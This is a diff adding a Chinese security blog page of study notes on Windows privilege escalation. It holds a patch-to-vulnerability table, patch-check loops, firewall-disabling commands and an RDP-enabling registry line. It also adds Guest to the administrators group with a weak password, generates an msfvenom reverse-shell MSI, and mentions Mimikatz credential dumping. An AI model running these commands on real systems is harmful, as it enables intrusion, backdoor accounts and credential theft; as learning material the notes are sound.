@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="白尾青芳の小窝">
+  <title>Windows提权 | 白尾青芳の小窝</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;600;700&family=Space+Grotesk:wght@500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/styles.css?v=20260722-2148">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+  <video class="backdrop" autoplay muted loop playsinline preload="auto" aria-hidden="true">
+    <source src="/images/wallpaper.mp4" type="video/mp4">
+  </video>
+
+  <button class="mobile-menu" id="menuToggle" type="button" aria-label="打开导航" aria-expanded="false">
+    <span></span><span></span><span></span>
+  </button>
+
+  <aside class="sidebar" id="sidebar">
+    <div class="profile">
+      <img class="avatar" src="/images/fox-avatar.jpg" alt="白尾青芳头像">
+      <p class="eyebrow">SECURITY · CODE · NOTES</p>
+      <h1>白尾青芳</h1>
+      <p class="motto">在每一次请求与响应之间，找到系统真实的边界。</p>
+    </div>
+
+    <nav class="main-nav" aria-label="主导航">
+      <a class="" href="/"><i data-lucide="home"></i><span>博客首页</span></a>
+      <a class="" href="/study/"><i data-lucide="book-open"></i><span>学习导航</span></a>
+      <a href="/categories/Web-%E5%AE%89%E5%85%A8/"><i data-lucide="shield-check"></i><span>Web 安全</span></a>
+      <a href="/categories/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"><i data-lucide="code-2"></i><span>开发笔记</span></a>
+      <a class="" href="/archives/"><i data-lucide="archive"></i><span>文章归档</span></a>
+      <a href="/about/"><i data-lucide="user-round"></i><span>关于我</span></a>
+    </nav>
+
+    <div class="sidebar-footer">
+      <div class="social-links">
+        <a target="_blank" rel="noopener" href="https://github.com/baiweiqingfang" aria-label="GitHub" title="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .5C5.65.5.5 5.65.5 12c0 5.1 3.29 9.43 7.86 10.96.58.1.79-.25.79-.56v-2.14c-3.2.7-3.87-1.36-3.87-1.36-.52-1.34-1.28-1.7-1.28-1.7-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.2 1.77 1.2 1.03 1.76 2.7 1.25 3.36.96.1-.75.4-1.25.73-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.25.45-2.28 1.19-3.08-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.17 1.18.92-.26 1.9-.38 2.88-.39.98 0 1.96.13 2.88.39 2.2-1.49 3.16-1.18 3.16-1.18.63 1.58.23 2.75.11 3.04.74.8 1.19 1.83 1.19 3.08 0 4.42-2.69 5.39-5.25 5.67.41.36.78 1.06.78 2.14v3.17c0 .31.21.67.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5Z"/></svg></a>
+        <a href="/atom.xml" aria-label="RSS" title="RSS"><i data-lucide="rss"></i></a>
+      </div>
+      <p>© 2026 白尾青芳 · Powered by Hexo</p>
+    </div>
+  </aside>
+
+  <main class="content">
+    <article class="article-page">
+  <header class="article-header">
+    <p class="eyebrow">learning</p>
+    <h1>Windows提权</h1>
+    <div class="post-meta">
+      <time datetime="2026-01-02T07:09:25.000Z">2026.01.02</time>
+      <span>8 分钟阅读</span>
+    </div>
+  </header>
+  <div class="article-content">
+    
+# Windows提权
+
+Web应用部署在Windows系统中：
+
+Web套件
+
+IIS，权限较低，需要提权
+
+## 操作系统漏洞提权
+
+Windows操作系统本身存在权限漏洞，如果没有补丁，就意味着漏洞存在
+
+### 补丁与漏洞对照表
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">KB944653 MS07-067</span><br><span class="line">KB942831 MS08-005</span><br><span class="line">KB952004 MS09-012 PR</span><br><span class="line">KB956572 MS09-012 巴西烤肉</span><br><span class="line">KB977165 MS10-015 Ms Viru</span><br><span class="line">KB970483 MS09-020 IIS6</span><br><span class="line"></span><br><span class="line">KB971657 MS09-041</span><br><span class="line">KB2124261 MS10-065</span><br><span class="line"></span><br><span class="line">KB2271195 MS10-065 IIS7</span><br><span class="line">KB2360937 MS10-084</span><br><span class="line"></span><br><span class="line">KB2393802 MS11-011</span><br><span class="line"></span><br><span class="line">KB2478960 MS11-014</span><br><span class="line">KB2503665 MS11-046</span><br><span class="line">KB2507938 MS11-056</span><br><span class="line">KB2566454 MS11-062</span><br><span class="line">KB2592799 MS11-080</span><br><span class="line">KB2620712 MS11-097</span><br><span class="line">KB2646524 MS12-003</span><br><span class="line"></span><br><span class="line">KB2645640 MS12-009</span><br><span class="line"></span><br><span class="line">KB2641653 MS12-018</span><br><span class="line">KB2621440 MS12-020</span><br><span class="line">KB2707511 MS12-042 sysret -pid</span><br><span class="line">KB2829361 MS13-046</span><br><span class="line">KB2850851 MS13-053 EPATHOBJ 0day 限32位</span><br><span class="line">KB3000061 MS14-058</span><br><span class="line"></span><br><span class="line">KB3031432 MS15-015</span><br><span class="line">KB3045171 MS15-051</span><br><span class="line">KB3077657 MS15-077</span><br><span class="line">KB3079904 MS15-097</span><br><span class="line">KB3134228 MS16-014</span><br><span class="line">KB3124280 MS16-016</span><br><span class="line">KB3139914 MS16-032</span><br><span class="line">KB3198234 MS16-135</span><br><span class="line">KB4013081 MS17-017</span><br></pre></td></tr></table></figure>
+
+### 查看系统补丁
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows 2003</span></span><br><span class="line"></span><br><span class="line">systeminfo&gt;C:\Windows\Temp\a.txt&amp;(for %i in (KB3057191 KB2840221 KB3000061 KB2850851 KB2711167 KB2360937 KB2478960</span><br><span class="line">KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 KB942831 KB2503665</span><br><span class="line">KB2592799 KB956572 KB977165 KB2621440) do @type C:Windows\Temp\a.txt|@find /i &quot;%i&quot;| | @echo %i Not Installed!)&amp;del /f</span><br><span class="line">/q /a C:\Windows\Temp\a.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># windows 2008</span></span><br><span class="line">systeminfo&gt;C:\Windows\Temp\a.txt&amp;(for %i in (KB3124280 KB3143141 KB3134228 KB3079904 KB3077657 KB3124280 KB3045171</span><br><span class="line">KB2829361 KB3000061 KB2850851 KB2707511 KB970483 KB2124261 KB2271195 KB3031432) do @type C:\Windows\Temp\a.txt|@find</span><br><span class="line">/i &quot;%i&quot; | | @echo %i Not Installed!)&amp;del /F /q /a C:\Windows\Temp\a.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># windows 2012</span></span><br><span class="line">systeminfo&gt;C:\Windows\Temp\a.txt&amp;(for %i in (KB3124280 KB3143141 KB3134228 KB3079904 KB3077657 KB3124280 KB3045171</span><br><span class="line">KB2829361 KB3000061 KB2850851 KB2707511 KB970483 KB2124261 KB2271195 KB3031432) do @type C:\Windows\Temp\a.txt|@find</span><br><span class="line">/i &quot;%i&quot; | | @echo %i Not Installed!)&amp;del/f /q/a C:\Windows\Temp\a.txt</span><br></pre></td></tr></table></figure>
+
+### 远程登陆
+
+防火墙状态相关命令：
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看防火墙状态</span></span><br><span class="line">netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启防火墙</span></span><br><span class="line">netsh firewall set opmode <span class="attr">mode</span>=enable</span><br><span class="line">netsh advfirewall set allprofiles state on</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭防火墙</span></span><br><span class="line">netsh firewall set opmode <span class="attr">mode</span>=disable</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+开启RDP
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 3389.bat</span></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0</span><br><span class="line">/f</span><br></pre></td></tr></table></figure>
+
+启用Guest用户
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user Guest /active:yes</span><br><span class="line">net localgroup administrators Guest /add</span><br><span class="line">net user Guest 123.com</span><br></pre></td></tr></table></figure>
+
+## 数据库提权
+
+核心思路：
+
+需要最高权限数据库账户
+
+利用数据库执行系统命令
+
+### MySQL提权
+
+考虑因素：
+
+
+
+### 1. 服务配置错误
+
+- Unquoted Service Path
+  - 原理：服务路径含空格且未加引号，可劫持前缀路径  
+  - 检测：`wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"`  
+  - 利用：在路径前段放置同名 exe
+- 可修改服务二进制
+  - 检测：`accesschk.exe -ucqv "服务名"`（Sysinternals）  
+  - 利用：替换为 msfvenom 生成的 payload
+
+### 2. DLL 劫持
+
+- 应用加载 DLL 时未指定完整路径，优先从当前目录加载  
+- 检测：Process Monitor 监控 DLL 加载路径  
+- 利用：放置恶意 DLL 到可写目录
+
+### 3. 特权令牌滥用（Token Impersonation）
+
+- SeImpersonatePrivilege / SeAssignPrimaryPrivilege
+  - 工具：`JuicyPotato`, `PrintSpoofer`, `RoguePotato`  
+  - 前提：拥有对应特权（`whoami /priv` 查看）
+
+### 4. AlwaysInstallElevated
+
+- 组策略允许低权限用户以 SYSTEM 安装 MSI  
+- 检测：`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
+- 利用：`msfvenom -p windows/x64/shell_reverse_tcp -f msi -o evil.msi`
+
+### 5. 计划任务滥用
+
+- 可修改的 .xml 任务文件或可写任务脚本  
+- 检测：`schtasks /query /fo LIST /v`，`icacls C:\Windows\System32\Tasks\*`
+
+### 6. 内核漏洞
+
+- 如 MS17-010（本地提权变种）、CVE-2021-34527（PrintNightmare）  
+- 检测：`systeminfo` → 查补丁 → 使用 `Windows Exploit Suggester`
+
+### 7. 凭证窃取
+
+- **Mimikatz**：抓取 LSASS 中明文密码、Hash、Ticket  
+- **注册表/配置文件**：如 AutoLogon 密码、RDP 凭证  
+- **PowerShell 历史**：`Get-Content (Get-PSReadlineOption).HistorySavePath`
+
+
+
+
+
+  </div>
+</article>
+
+  </main>
+
+  <button class="back-to-top" id="backToTop" type="button" aria-label="回到顶部"><i data-lucide="arrow-up"></i></button>
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+  <script src="/js/main.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+
+
+
